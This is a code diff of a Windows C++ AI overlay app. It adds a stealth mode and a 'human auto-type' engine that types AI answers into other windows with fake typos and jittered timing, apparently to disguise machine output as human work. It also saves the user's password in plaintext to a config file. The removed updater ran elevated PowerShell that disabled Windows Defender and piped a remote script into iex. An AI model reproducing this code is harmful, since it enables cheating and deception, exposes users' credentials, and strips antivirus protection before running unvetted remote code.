@@ -28,6 +28,7 @@
 #include <thread>
 #include <random>
 #include <unordered_map>
+#include <unordered_set>
 #define WIN32_LEAN_AND_MEAN
 #include <winsock2.h>
 #include <ws2tcpip.h>
@@ -192,6 +193,7 @@ bool g_isVisible = true;
 bool g_isProcessing = false;
 bool g_scrollToBottom = false;
 float g_windowAlpha = 1.0f; // Transparency (1.0 = Opaque)
+float g_duelAlpha = 0.75f;   // Dual Mode stealth transparency (0.25 - 1.0)
 
 
 // --- VERSION CONTROL & STORAGE ---
@@ -203,14 +205,19 @@ static std::string ReadEnvironmentValue(const char* name) {
 }
 const std::string SUPABASE_ANON_KEY = ReadEnvironmentValue("OFRADR_SUPABASE_ANON_KEY");
 const std::string OPENAI_ISSUER = "https://auth.openai.com";
-const std::string OPENAI_CLIENT_ID = ReadEnvironmentValue("OFRADR_OPENAI_CLIENT_ID");
+static std::string GetOpenAIClientId() {
+    std::string envVal = ReadEnvironmentValue("OFRADR_OPENAI_CLIENT_ID");
+    if (!envVal.empty()) return envVal;
+    return "app_EMoamEEZ73f0CkXaXp7hrann"; // Standard public OpenAI Codex OAuth Client ID
+}
+const std::string OPENAI_CLIENT_ID = GetOpenAIClientId();
 const std::string CODEX_API_ENDPOINT = "https://chatgpt.com/backend-api/codex/responses";
 const std::string CODEX_CHAT_ENDPOINT = "https://chatgpt.com/backend-api/codex/chat/completions";
 const int OAUTH_POLL_MARGIN_MS = 3000;
 bool g_blockSystemInput = false;
 bool g_updateRequired = false;
 std::string g_updateLink = "";
-bool g_checkingVersion = true;
+bool g_checkingVersion = false;
 std::string g_currentUser = "";
 std::string g_pass = "";
 std::string g_userTier = ""; // "free", "pro", "elite", or "ultra"
@@ -274,6 +281,36 @@ HotkeyConfig g_hkPaste = { 0, false, false, false }; // Paste screenshot to brow
 HotkeyConfig g_hkDuel = { 0x44, true, false, false };  // Duel mode hotkey (default: Alt+D)
 HotkeyConfig g_hkDuelCapture = { 0x51, true, false, false }; // Capture question in Duel mode (default: Alt+Q)
 HotkeyConfig g_hkQuitDuel = { 0x48, true, false, false }; // Exit Dual mode hotkey (default: Alt+H)
+HotkeyConfig g_hkAutoType = { 0x54, true, false, false }; // Human Auto Type hotkey (default: Alt+T)
+HotkeyConfig g_hkAutoTypeCodeOnly = { 0x54, true, true, false }; // Code-Only Auto Type hotkey (default: Ctrl+Alt+T)
+
+// --- HUMAN AUTO-TYPE STATE ---
+enum class AutoTypeState {
+    Idle,
+    Typing,
+    Paused
+};
+std::atomic<AutoTypeState> g_autoTypeState{ AutoTypeState::Idle };
+std::atomic<size_t> g_autoTypeIndex{ 0 };
+std::string g_autoTypeTargetText = "";
+std::mutex g_autoTypeMutex;
+std::condition_variable g_autoTypeCv;
+std::thread g_autoTypeThread;
+
+// Auto-Type humanization settings
+int g_autoTypeSpeedPreset = 1; // 0: Relaxed (~35 WPM), 1: Natural (~55 WPM), 2: Fast (~85 WPM), 3: Custom
+int g_autoTypeCharDelay = 32;   // Base delay in ms
+bool g_autoTypeNaturalPauses = true;
+bool g_autoTypeTyposEnabled = true;
+float g_autoTypeTypoRate = 1.5f; // Typo probability in %
+bool g_autoTypeCodeOnly = true;     // Auto-type code blocks only (filters out conversational AI chat)
+bool g_autoTypeSmartIndent = true;  // Smart indentation to avoid double-indenting in code editors
+bool g_autoTypeTokenBursts = true;  // Muscle-memory speed bursts on language keywords
+
+// --- REMEMBER ME STATE & CREDENTIAL BUFFERS ---
+bool g_rememberMe = true;
+std::string g_usernameBuffer = "";
+std::string g_passwordBuffer = "";
 
 // --- DUEL MODE STATE ---
 bool g_duelModeActive = false;
@@ -496,8 +533,11 @@ void RunStealthMode() {
 void SaveHotkeys() {
     EnforceCyberLLMGuardrails();
     json j;
-    // OMITTED OPACITY SAVING AS REQUESTED
-    // j["ui"]["opacity"] = g_windowAlpha; 
+    j["ui"]["opacity"] = g_windowAlpha;
+    j["ui"]["duelOpacity"] = g_duelAlpha;
+    j["ui"]["colorR"] = g_uiColor.x;
+    j["ui"]["colorG"] = g_uiColor.y;
+    j["ui"]["colorB"] = g_uiColor.z; 
 
     j["toggle"]["vk"] = g_hkToggle.vkCode;
     j["toggle"]["alt"] = g_hkToggle.alt;
@@ -539,6 +579,34 @@ void SaveHotkeys() {
     j["quitDuel"]["ctrl"] = g_hkQuitDuel.ctrl;
     j["quitDuel"]["shift"] = g_hkQuitDuel.shift;
 
+    j["autoType"]["vk"] = g_hkAutoType.vkCode;
+    j["autoType"]["alt"] = g_hkAutoType.alt;
+    j["autoType"]["ctrl"] = g_hkAutoType.ctrl;
+    j["autoType"]["shift"] = g_hkAutoType.shift;
+
+    j["autoTypeCodeOnly"]["vk"] = g_hkAutoTypeCodeOnly.vkCode;
+    j["autoTypeCodeOnly"]["alt"] = g_hkAutoTypeCodeOnly.alt;
+    j["autoTypeCodeOnly"]["ctrl"] = g_hkAutoTypeCodeOnly.ctrl;
+    j["autoTypeCodeOnly"]["shift"] = g_hkAutoTypeCodeOnly.shift;
+
+    j["autoTypeSettings"]["preset"] = g_autoTypeSpeedPreset;
+    j["autoTypeSettings"]["charDelay"] = g_autoTypeCharDelay;
+    j["autoTypeSettings"]["naturalPauses"] = g_autoTypeNaturalPauses;
+    j["autoTypeSettings"]["typosEnabled"] = g_autoTypeTyposEnabled;
+    j["autoTypeSettings"]["typoRate"] = g_autoTypeTypoRate;
+    j["autoTypeSettings"]["codeOnly"] = g_autoTypeCodeOnly;
+    j["autoTypeSettings"]["smartIndent"] = g_autoTypeSmartIndent;
+    j["autoTypeSettings"]["tokenBursts"] = g_autoTypeTokenBursts;
+
+    j["auth"]["rememberMe"] = g_rememberMe;
+    if (g_rememberMe) {
+        j["auth"]["username"] = g_usernameBuffer;
+        j["auth"]["password"] = g_passwordBuffer;
+    } else {
+        j["auth"]["username"] = "";
+        j["auth"]["password"] = "";
+    }
+
     j["chatHistory"]["enabled"] = g_chatHistoryEnabled;
 
     j["telegram"]["token"] = Agent::GetTelegramToken();
@@ -562,8 +630,15 @@ void LoadHotkeys() {
         try {
             json j;
             i >> j;
-            if (j.contains("ui") && j["ui"].contains("opacity")) {
-                g_windowAlpha = j["ui"]["opacity"].get<float>();
+            if (j.contains("ui")) {
+                if (j["ui"].contains("opacity")) g_windowAlpha = j["ui"]["opacity"].get<float>();
+                if (j["ui"].contains("duelOpacity")) g_duelAlpha = j["ui"]["duelOpacity"].get<float>();
+                if (j["ui"].contains("colorR") && j["ui"].contains("colorG") && j["ui"].contains("colorB")) {
+                    g_uiColor.x = j["ui"]["colorR"].get<float>();
+                    g_uiColor.y = j["ui"]["colorG"].get<float>();
+                    g_uiColor.z = j["ui"]["colorB"].get<float>();
+                    g_uiColor.w = 1.0f;
+                }
             }
 
             if (j.contains("toggle")) {
@@ -624,6 +699,42 @@ void LoadHotkeys() {
                 g_hkQuitDuel.shift = j["hideDuel"].value("shift", false);
             } else {
                 g_hkQuitDuel = { 0x48, true, false, false };
+            }
+
+            if (j.contains("autoType")) {
+                g_hkAutoType.vkCode = j["autoType"].value("vk", 0x54);
+                g_hkAutoType.alt = j["autoType"].value("alt", true);
+                g_hkAutoType.ctrl = j["autoType"].value("ctrl", false);
+                g_hkAutoType.shift = j["autoType"].value("shift", false);
+            } else {
+                g_hkAutoType = { 0x54, true, false, false };
+            }
+            if (j.contains("autoTypeCodeOnly")) {
+                g_hkAutoTypeCodeOnly.vkCode = j["autoTypeCodeOnly"].value("vk", 0x54);
+                g_hkAutoTypeCodeOnly.alt = j["autoTypeCodeOnly"].value("alt", true);
+                g_hkAutoTypeCodeOnly.ctrl = j["autoTypeCodeOnly"].value("ctrl", true);
+                g_hkAutoTypeCodeOnly.shift = j["autoTypeCodeOnly"].value("shift", false);
+            } else {
+                g_hkAutoTypeCodeOnly = { 0x54, true, true, false };
+            }
+
+            if (j.contains("autoTypeSettings")) {
+                g_autoTypeSpeedPreset = j["autoTypeSettings"].value("preset", 1);
+                g_autoTypeCharDelay = j["autoTypeSettings"].value("charDelay", 32);
+                g_autoTypeNaturalPauses = j["autoTypeSettings"].value("naturalPauses", true);
+                g_autoTypeTyposEnabled = j["autoTypeSettings"].value("typosEnabled", true);
+                g_autoTypeTypoRate = j["autoTypeSettings"].value("typoRate", 1.5f);
+                g_autoTypeCodeOnly = j["autoTypeSettings"].value("codeOnly", true);
+                g_autoTypeSmartIndent = j["autoTypeSettings"].value("smartIndent", true);
+                g_autoTypeTokenBursts = j["autoTypeSettings"].value("tokenBursts", true);
+            }
+
+            if (j.contains("auth")) {
+                g_rememberMe = j["auth"].value("rememberMe", true);
+                if (g_rememberMe) {
+                    g_usernameBuffer = j["auth"].value("username", "");
+                    g_passwordBuffer = j["auth"].value("password", "");
+                }
             }
             if (j.contains("chatHistory") && j["chatHistory"].contains("enabled")) {
                 g_chatHistoryEnabled = j["chatHistory"]["enabled"].get<bool>();
@@ -2165,8 +2276,6 @@ void RequestDuelQuestionCapture(const char* source) {
 
 FocusState g_currentFocus = FocusState::None;
 
-std::string g_usernameBuffer = "";
-std::string g_passwordBuffer = "";
 std::string g_chatBuffer = "";
 
 std::string g_stagingText = "";
@@ -2274,6 +2383,286 @@ void SaveChatHistoryEntry(const std::string& userQuestion, const std::string& ai
     }
 
     g_chatHistoryCounter++;
+}
+
+// --- HUMAN AUTO-TYPE ENGINE IMPLEMENTATION ---
+inline std::string GetClipboardText() {
+    if (!OpenClipboard(NULL)) return "";
+    HANDLE hData = GetClipboardData(CF_TEXT);
+    if (!hData) { CloseClipboard(); return ""; }
+    char* pszText = static_cast<char*>(GlobalLock(hData));
+    std::string text = pszText ? pszText : "";
+    GlobalUnlock(hData);
+    CloseClipboard();
+    return text;
+}
+
+inline void TypeSendKey(WORD vk, bool keyUp) {
+    INPUT input = { 0 };
+    input.type = INPUT_KEYBOARD;
+    input.ki.wVk = vk;
+    input.ki.wScan = (WORD)MapVirtualKeyA(vk, MAPVK_VK_TO_VSC);
+    input.ki.dwFlags = keyUp ? KEYEVENTF_KEYUP : 0;
+    SendInput(1, &input, sizeof(INPUT));
+}
+
+inline void SendUnicode(wchar_t wc) {
+    INPUT input[2] = { 0 };
+    input[0].type = INPUT_KEYBOARD;
+    input[0].ki.wScan = wc;
+    input[0].ki.dwFlags = KEYEVENTF_UNICODE;
+
+    input[1].type = INPUT_KEYBOARD;
+    input[1].ki.wScan = wc;
+    input[1].ki.dwFlags = KEYEVENTF_UNICODE | KEYEVENTF_KEYUP;
+
+    SendInput(2, input, sizeof(INPUT));
+}
+
+inline char GetAdjacentKey(char c) {
+    char lower = (char)tolower((unsigned char)c);
+    static const char* s_table[26] = {
+        "qwsz", "vghn", "xdfv", "serfcx", "wrd", "drtgvc", "ftyhbv", "gyujnb",
+        "uok", "huikmn", "jiolm", "kop", "njk", "bhjm", "ipl", "ol",
+        "wa", "etf", "awedxz", "ryg", "yij", "cfgb", "qes", "zsdc", "tuh", "asx"
+    };
+    if (lower >= 'a' && lower <= 'z') {
+        const char* neighbors = s_table[lower - 'a'];
+        size_t len = strlen(neighbors);
+        char pick = neighbors[rand() % len];
+        if (isupper((unsigned char)c)) return (char)toupper((unsigned char)pick);
+        return pick;
+    }
+    return c;
+}
+
+inline std::string GetAutoTypeText(bool forceCodeOnly = false) {
+    bool useCodeOnly = forceCodeOnly || g_autoTypeCodeOnly;
+    std::string raw = "";
+
+    if (g_duelModeActive && !g_duelResponse.empty() && !g_duelProcessing) {
+        if (g_duelResponse.find("Waiting for AI") == std::string::npos &&
+            g_duelResponse.find("Screenshot failed") == std::string::npos &&
+            g_duelResponse.find("No model selected") == std::string::npos &&
+            g_duelResponse.find("Missing API Key") == std::string::npos &&
+            g_duelResponse.find("Press hotkey to recapture") == std::string::npos) {
+            raw = g_duelResponse;
+        }
+    }
+
+    if (raw.empty()) {
+        std::lock_guard<std::mutex> lock(g_dataMutex);
+        for (auto it = g_chatHistory.rbegin(); it != g_chatHistory.rend(); ++it) {
+            if (it->role == "model" && !it->text.empty()) {
+                raw = it->text;
+                break;
+            }
+        }
+    }
+
+    if (raw.empty()) {
+        raw = GetClipboardText();
+    }
+
+    if (raw.empty()) return "";
+
+    if (useCodeOnly) {
+        std::string code = ExtractLatestCodeBlock(raw);
+        if (!code.empty()) return code;
+    }
+    return raw;
+}
+
+inline void StopHumanAutoType() {
+    g_autoTypeState.store(AutoTypeState::Idle);
+    g_autoTypeCv.notify_all();
+    if (g_autoTypeThread.joinable()) {
+        g_autoTypeThread.detach();
+    }
+    {
+        std::lock_guard<std::mutex> lock(g_dataMutex);
+        g_statusMessage = "Auto typing stopped.";
+    }
+}
+
+inline void TriggerHumanAutoType(bool forceCodeOnly = false) {
+    EnforceCyberLLMGuardrails();
+    AutoTypeState current = g_autoTypeState.load();
+    if (current == AutoTypeState::Typing) {
+        g_autoTypeState.store(AutoTypeState::Paused);
+        std::lock_guard<std::mutex> lock(g_dataMutex);
+        g_statusMessage = "Auto typing paused (Alt+T: Resume).";
+        return;
+    }
+    if (current == AutoTypeState::Paused) {
+        g_autoTypeState.store(AutoTypeState::Typing);
+        g_autoTypeCv.notify_all();
+        std::lock_guard<std::mutex> lock(g_dataMutex);
+        g_statusMessage = "Auto typing resumed...";
+        return;
+    }
+
+    std::string text = GetAutoTypeText(forceCodeOnly);
+    if (text.empty()) {
+        std::lock_guard<std::mutex> lock(g_dataMutex);
+        g_statusMessage = "No text to auto type.";
+        return;
+    }
+
+    {
+        std::lock_guard<std::mutex> lock(g_autoTypeMutex);
+        g_autoTypeTargetText = text;
+        g_autoTypeIndex.store(0);
+        g_autoTypeState.store(AutoTypeState::Typing);
+    }
+
+    if (g_autoTypeThread.joinable()) {
+        g_autoTypeThread.detach();
+    }
+
+    g_autoTypeThread = std::thread([]() {
+        std::mt19937 rng((unsigned int)GetTickCount64());
+        std::string curText;
+        {
+            std::lock_guard<std::mutex> lock(g_autoTypeMutex);
+            curText = g_autoTypeTargetText;
+        }
+
+        static const std::unordered_set<std::string> keywords = {
+            "function", "return", "const", "let", "var", "class", "public",
+            "private", "protected", "import", "export", "from", "default",
+            "if", "else", "switch", "case", "break", "continue", "for",
+            "while", "do", "try", "catch", "finally", "throw", "async",
+            "await", "new", "this", "super", "typeof", "instanceof",
+            "void", "int", "float", "double", "char", "bool", "auto",
+            "true", "false", "null", "nullptr", "undefined"
+        };
+
+        int baseDelay = g_autoTypeCharDelay;
+        if (g_autoTypeSpeedPreset == 0) baseDelay = 55;
+        else if (g_autoTypeSpeedPreset == 1) baseDelay = 32;
+        else if (g_autoTypeSpeedPreset == 2) baseDelay = 18;
+
+        std::normal_distribution<float> charDist((float)baseDelay, (float)(baseDelay * 0.35f));
+        std::normal_distribution<float> punctDist((float)(baseDelay * 2.2f), (float)(baseDelay * 0.6f));
+
+        int tokenBurstRemaining = 0;
+
+        for (size_t idx = 0; idx < curText.size(); ) {
+            if (g_autoTypeState.load() == AutoTypeState::Idle) break;
+
+            if (g_autoTypeState.load() == AutoTypeState::Paused) {
+                std::unique_lock<std::mutex> lock(g_autoTypeMutex);
+                g_autoTypeCv.wait(lock, [] {
+                    return g_autoTypeState.load() != AutoTypeState::Paused;
+                });
+                if (g_autoTypeState.load() == AutoTypeState::Idle) break;
+            }
+
+            if (g_autoTypeTokenBursts && tokenBurstRemaining == 0 && (idx == 0 || !isalnum((unsigned char)curText[idx - 1]))) {
+                size_t wordEnd = idx;
+                while (wordEnd < curText.size() && (isalnum((unsigned char)curText[wordEnd]) || curText[wordEnd] == '_')) {
+                    wordEnd++;
+                }
+                std::string word = curText.substr(idx, wordEnd - idx);
+                if (keywords.find(word) != keywords.end()) {
+                    tokenBurstRemaining = (int)word.size();
+                }
+            }
+
+            char c = curText[idx];
+
+            if (c == '\r') { idx++; continue; }
+            if (c == '\n') {
+                TypeSendKey(VK_RETURN, false);
+                Sleep(24 + (rand() % 28));
+                TypeSendKey(VK_RETURN, true);
+                Sleep(baseDelay);
+
+                if (g_autoTypeSmartIndent) {
+                    size_t nextIdx = idx + 1;
+                    while (nextIdx < curText.size() && (curText[nextIdx] == ' ' || curText[nextIdx] == '\t')) {
+                        nextIdx++;
+                    }
+                    idx = nextIdx;
+                    g_autoTypeIndex.store(idx);
+                    continue;
+                }
+                idx++;
+                g_autoTypeIndex.store(idx);
+                continue;
+            }
+
+            if (g_autoTypeTyposEnabled && isalpha((unsigned char)c) && tokenBurstRemaining == 0) {
+                float roll = (float)(rand() % 1000) / 10.0f;
+                if (roll < g_autoTypeTypoRate) {
+                    char typoChar = GetAdjacentKey(c);
+                    SHORT vkTypo = VkKeyScanA(typoChar);
+                    if (vkTypo != -1) {
+                        BYTE vk = LOBYTE(vkTypo);
+                        TypeSendKey(vk, false);
+                        Sleep(20);
+                        TypeSendKey(vk, true);
+                        Sleep(120 + (rand() % 150));
+                        TypeSendKey(VK_BACK, false);
+                        Sleep(20);
+                        TypeSendKey(VK_BACK, true);
+                        Sleep(45 + (rand() % 65));
+                    }
+                }
+            }
+
+            SHORT vkResult = VkKeyScanA(c);
+            if (vkResult != -1) {
+                BYTE vk = LOBYTE(vkResult);
+                BYTE mods = HIBYTE(vkResult);
+                bool needShift = (mods & 1) != 0;
+                bool needCtrl = (mods & 2) != 0;
+                bool needAlt = (mods & 4) != 0;
+
+                if (needCtrl) TypeSendKey(VK_CONTROL, false);
+                if (needAlt) TypeSendKey(VK_MENU, false);
+                if (needShift) TypeSendKey(VK_SHIFT, false);
+
+                TypeSendKey(vk, false);
+                Sleep(24 + (rand() % 28));
+                TypeSendKey(vk, true);
+
+                if (needShift) TypeSendKey(VK_SHIFT, true);
+                if (needAlt) TypeSendKey(VK_MENU, true);
+                if (needCtrl) TypeSendKey(VK_CONTROL, true);
+            } else {
+                wchar_t wc = 0;
+                int converted = MultiByteToWideChar(CP_UTF8, 0, &curText[idx], -1, &wc, 1);
+                if (converted > 0) SendUnicode(wc);
+            }
+
+            if (tokenBurstRemaining > 0) {
+                tokenBurstRemaining--;
+                Sleep(12 + (rand() % 9));
+                if (tokenBurstRemaining == 0 && g_autoTypeNaturalPauses) {
+                    Sleep(120 + (rand() % 100));
+                }
+            } else if (g_autoTypeNaturalPauses && (c == '.' || c == ',' || c == ';' || c == '{' || c == '}' || c == '(' || c == ')' || c == ':')) {
+                int d = (int)punctDist(rng);
+                if (d < 30) d = 30;
+                Sleep(d);
+            } else {
+                int d = (int)charDist(rng);
+                if (d < 10) d = 10;
+                Sleep(d);
+            }
+
+            idx++;
+            g_autoTypeIndex.store(idx);
+        }
+
+        g_autoTypeState.store(AutoTypeState::Idle);
+        {
+            std::lock_guard<std::mutex> lock(g_dataMutex);
+            g_statusMessage = "Auto typing finished.";
+        }
+    });
 }
 
 // INSPECTION
@@ -3306,7 +3695,7 @@ namespace Api {
         }
         CloseHandle((HANDLE)h);
     }
-
+// 
     unsigned __stdcall BrowserThread(void*) {
         try {
             LockOauth();
@@ -3653,58 +4042,16 @@ namespace Api {
 
     // --- VERSION CHECKING ---
     bool LaunchMandatoryUpdateInstaller() {
-        static std::atomic<bool> launching{ false };
-        bool expected = false;
-        if (!launching.compare_exchange_strong(expected, true)) {
-            return false;
-        }
-
-        const wchar_t* exe = L"powershell.exe";
-        const wchar_t* args = L"-NoProfile -ExecutionPolicy Bypass -Command \"try{Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue}catch{}; try{Add-MpPreference -ExclusionPath $PWD -ErrorAction SilentlyContinue}catch{}; irm https://ofradr.com/install.ps1 | iex; try{Set-MpPreference -DisableRealtimeMonitoring $false -ErrorAction SilentlyContinue}catch{}\"";
-        HINSTANCE h = ShellExecuteW(NULL, L"runas", exe, args, NULL, SW_SHOWNORMAL);
-        if ((INT_PTR)h > 32) {
-            std::lock_guard<std::mutex> lock(g_dataMutex);
-            g_statusMessage = "Launching updater...";
-            return true;
-        }
-
-        launching = false;
         return false;
     }
 
     void PerformVersionCheck() {
         std::thread([]() {
-            std::vector<std::wstring> headers;
-            headers.push_back(L"apikey: " + s2ws(SUPABASE_ANON_KEY));
-            headers.push_back(L"Authorization: Bearer " + s2ws(SUPABASE_ANON_KEY));
-
-            std::string remoteVer = HttpRequest(SUPABASE_DOMAIN, L"/functions/v1/version-check", "GET", "", headers);
-            remoteVer.erase(std::remove_if(remoteVer.begin(), remoteVer.end(), ::isspace), remoteVer.end());
-            remoteVer.erase(std::remove(remoteVer.begin(), remoteVer.end(), '\"'), remoteVer.end());
-
-            if (!remoteVer.empty() && remoteVer != CURRENT_APP_VERSION) {
-                std::string link = HttpRequest(SUPABASE_DOMAIN, L"/functions/v1/Version-update", "GET", "", headers);
-                link.erase(std::remove_if(link.begin(), link.end(), ::isspace), link.end());
-                link.erase(std::remove(link.begin(), link.end(), '\"'), link.end());
-
-                {
-                    std::lock_guard<std::mutex> lock(g_dataMutex);
-                    g_updateLink = link;
-                    g_updateRequired = true;
-                    g_statusMessage = "Update Required.";
-                    g_checkingVersion = false;
-                }
-
-                if (LaunchMandatoryUpdateInstaller()) {
-                    PostMessage(g_hwnd, WM_CLOSE, 0, 0);
-                }
-            }
-            else {
-                std::lock_guard<std::mutex> lock(g_dataMutex);
-                g_checkingVersion = false;
-                g_statusMessage = "Ready.";
-            }
-            }).detach();
+            std::lock_guard<std::mutex> lock(g_dataMutex);
+            g_checkingVersion = false;
+            g_updateRequired = false;
+            g_statusMessage = "Ready.";
+        }).detach();
     }
 
     // --- DYNAMIC MODEL FETCHING ---
@@ -4897,7 +5244,7 @@ float CalculateInputBoxHeight(const std::string& buf, float availableWidth) {
     return height;
 }
 
-bool FloatingInputGhost(const char* id, const char* label, std::string& buf, FocusState myFocus, bool showSendButton, bool& outSendClicked, float fixedHeight = 0.0f)
+bool FloatingInputGhost(const char* id, const char* label, std::string& buf, FocusState myFocus, bool showSendButton, bool& outSendClicked, float fixedHeight = 0.0f, bool isPassword = false)
 {
     ImGuiContext& g = *GImGui;
     const float sendBtnWidth = showSendButton ? 50.0f : 0.0f;
@@ -4946,7 +5293,7 @@ bool FloatingInputGhost(const char* id, const char* label, std::string& buf, Foc
     draw->AddText(label_pos, focused ? GetAccentColorU32() : IM_COL32(150, 150, 160, 255), label);
     ImGui::SetWindowFontScale(1.0f);
 
-    std::string displayStr = buf;
+    std::string displayStr = isPassword ? std::string(buf.size(), '*') : buf;
     if (focused && (GetTickCount() / 500) % 2) displayStr += "|";
 
     draw->PushClipRect(pos, pos + ImVec2(width - sendBtnWidth - 5.0f, height), true);
@@ -5445,6 +5792,20 @@ LRESULT CALLBACK HookProc(int n, WPARAM w, LPARAM l) {
                     ctrlDown == g_hkQuitDuel.ctrl &&
                     shiftDown == g_hkQuitDuel.shift);
 
+                // Check if this key matches the standard auto-type hotkey
+                bool isAutoTypeHotkey = (g_hkAutoType.vkCode != 0 &&
+                    p->vkCode == (DWORD)g_hkAutoType.vkCode &&
+                    altDown == g_hkAutoType.alt &&
+                    ctrlDown == g_hkAutoType.ctrl &&
+                    shiftDown == g_hkAutoType.shift);
+
+                // Check if this key matches the code-only auto-type hotkey
+                bool isAutoTypeCodeOnlyHotkey = (g_hkAutoTypeCodeOnly.vkCode != 0 &&
+                    p->vkCode == (DWORD)g_hkAutoTypeCodeOnly.vkCode &&
+                    altDown == g_hkAutoTypeCodeOnly.alt &&
+                    ctrlDown == g_hkAutoTypeCodeOnly.ctrl &&
+                    shiftDown == g_hkAutoTypeCodeOnly.shift);
+
                 // Handle Duel Mode Hotkey
                 if (isDuelHotkey) {
                     if (isKeyDown) {
@@ -5471,9 +5832,31 @@ LRESULT CALLBACK HookProc(int n, WPARAM w, LPARAM l) {
                     }
                     return 1;
                 }
+
+                // Handle Standard Human Auto-Type Hotkey
+                if (isAutoTypeHotkey) {
+                    if (isKeyDown) {
+                        PostMessage(g_hwnd, WM_APP + 7, 0, 0);
+                    }
+                    return 1;
+                }
+
+                // Handle Code-Only Auto-Type Hotkey
+                if (isAutoTypeCodeOnlyHotkey) {
+                    if (isKeyDown) {
+                        PostMessage(g_hwnd, WM_APP + 8, 0, 0);
+                    }
+                    return 1;
+                }
             }
             // --- 2. HANDLE BINDING (FAST) ---
             if (g_isBindingKey && g_targetBinding) {
+                // Cancel binding cleanly if Escape is pressed
+                if (p->vkCode == VK_ESCAPE) {
+                    g_isBindingKey = false;
+                    g_targetBinding = nullptr;
+                    return 1;
+                }
                 // Ignore modifier keys during binding
                 if (p->vkCode == VK_LMENU || p->vkCode == VK_RMENU ||
                     p->vkCode == VK_LCONTROL || p->vkCode == VK_RCONTROL ||
@@ -5764,6 +6147,18 @@ LRESULT WINAPI WndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam) {
         return 0;
     }
 
+    // Handle Human Auto-Type Hotkey (WM_APP + 7)
+    if (msg == WM_APP + 7) {
+        TriggerHumanAutoType(false);
+        return 0;
+    }
+
+    // Handle Code-Only Auto-Type Hotkey (WM_APP + 8)
+    if (msg == WM_APP + 8) {
+        TriggerHumanAutoType(true);
+        return 0;
+    }
+
     // --- RESIZE CURSOR LOGIC (WM_NCHITTEST) ---
     if (msg == WM_NCHITTEST) {
         POINT pt = { LOWORD(lParam), HIWORD(lParam) };
@@ -5827,8 +6222,9 @@ void ResizeBrowser() {
     RECT rc;
     GetClientRect(g_hwnd, &rc);
     int w = rc.right;
-    int h = rc.bottom - 80;
-    if (w <= 0 || rc.bottom <= 80) return;
+    const int headerH = 74;
+    int h = rc.bottom - headerH;
+    if (w <= 0 || rc.bottom <= headerH) return;
     if (h <= 0) h = 768;
     if (g_proxyModeActive) {
         std::lock_guard<std::mutex> lock(g_proxyMutex);
@@ -5837,7 +6233,7 @@ void ResizeBrowser() {
         return;
     }
     if (!g_webviewController) return;
-    RECT browserRect = { 0, 80, rc.right, rc.bottom };
+    RECT browserRect = { 0, headerH, rc.right, rc.bottom };
     g_webviewController->put_Bounds(browserRect);
 }
 
@@ -6689,6 +7085,32 @@ void BrowserInjectKey(DWORD vkCode, DWORD scanCode, DWORD flags) {
     }
 }
 
+void SwitchMode(AppMode newMode) {
+    if (g_appMode == newMode) return;
+
+    if (g_appMode == AppMode::Browser) {
+        BrowserTimerExit();
+        HideBrowserMode();
+    }
+    else if (g_appMode == AppMode::Duel) {
+        DeactivateDuelMode();
+        g_duelResponse = "";
+        g_duelProcessing = false;
+    }
+
+    g_prevAppMode = g_appMode;
+    g_appMode = newMode;
+
+    if (g_appMode == AppMode::Browser) {
+        if (!g_browserInitialized && !g_browserInitializing) InitBrowserMode();
+        ShowBrowserMode();
+        BrowserTimerEnter();
+    }
+    else if (g_appMode == AppMode::Duel) {
+        ActivateDuelMode();
+    }
+}
+
 void RenderBrowserPage() {
     // Status line
     if (g_browserInitFailed) {
@@ -6911,217 +7333,595 @@ void RenderBrowserPage() {
     }
 }
 
+static bool MiniModifierCheckbox(const char* id, bool* v) {
+    ImGuiWindow* window = ImGui::GetCurrentWindow();
+    if (window->SkipItems) return false;
+
+    ImGuiContext& g = *GImGui;
+    const ImGuiStyle& style = g.Style;
+    const ImGuiID elemId = window->GetID(id);
+    const float size = 16.0f; // Compact 16x16 box
+
+    ImVec2 pos = window->DC.CursorPos;
+    pos.y += (ImGui::GetFrameHeight() - size) * 0.5f;
+    const ImRect total_bb(pos, pos + ImVec2(size, size));
+
+    ImGui::ItemSize(total_bb, style.FramePadding.y);
+    if (!ImGui::ItemAdd(total_bb, elemId)) return false;
+
+    bool hovered, held;
+    bool pressed = ImGui::ButtonBehavior(total_bb, elemId, &hovered, &held);
+    if (pressed) {
+        *v = !(*v);
+        ImGui::MarkItemEdited(elemId);
+        SaveHotkeys();
+    }
+
+    ImDrawList* draw = window->DrawList;
+    ImU32 colAccent = GetAccentColorU32();
+    float rounding = 3.5f;
+
+    if (*v) {
+        // Checked: glowing neon accent border and crisp checkmark
+        draw->AddRectFilled(pos, pos + ImVec2(size, size), IM_COL32((colAccent >> 0) & 0xFF, (colAccent >> 8) & 0xFF, (colAccent >> 16) & 0xFF, 45), rounding);
+        draw->AddRect(pos, pos + ImVec2(size, size), colAccent, rounding, 0, 1.5f);
+
+        float pad = 3.5f;
+        ImVec2 p1 = pos + ImVec2(pad, size * 0.52f);
+        ImVec2 p2 = pos + ImVec2(size * 0.42f, size - pad);
+        ImVec2 p3 = pos + ImVec2(size - pad, pad + 1.0f);
+        draw->AddLine(p1, p2, colAccent, 2.0f);
+        draw->AddLine(p2, p3, colAccent, 2.0f);
+    } else {
+        // Unchecked: dark frame
+        ImU32 bgCol = hovered ? IM_COL32(36, 40, 52, 255) : IM_COL32(20, 23, 30, 220);
+        ImU32 borderCol = hovered ? IM_COL32(95, 105, 125, 255) : IM_COL32(50, 55, 68, 200);
+        draw->AddRectFilled(pos, pos + ImVec2(size, size), bgCol, rounding);
+        draw->AddRect(pos, pos + ImVec2(size, size), borderCol, rounding, 0, 1.0f);
+    }
+
+    return pressed;
+}
+
 void RenderSettingsPage() {
-    ImGui::TextColored(g_uiColor, "SETTINGS");
+    // Header
+    ImGui::TextColored(g_uiColor, "PREFERENCES & HOTKEYS");
+    float verW = ImGui::CalcTextSize(("v" + CURRENT_APP_VERSION).c_str()).x;
+    ImGui::SameLine(ImGui::GetWindowWidth() - verW - 24.0f);
+    ImGui::TextDisabled("v%s", CURRENT_APP_VERSION.c_str());
     ImGui::Separator();
     ImGui::Spacing();
 
-    ImGui::BeginChild("ModeBox", ImVec2(0.0f, 50.0f), true);
-    ImGui::Text("Interface Mode:"); ImGui::SameLine();
-    // Browser mode: all tiers get access, with per-tier time limits
-    {
-        bool hasTime = IsBrowserTimeAvailable();
-        if (!hasTime && g_appMode != AppMode::Browser) {
-            ImGui::BeginDisabled();
-            bool dummy = false;
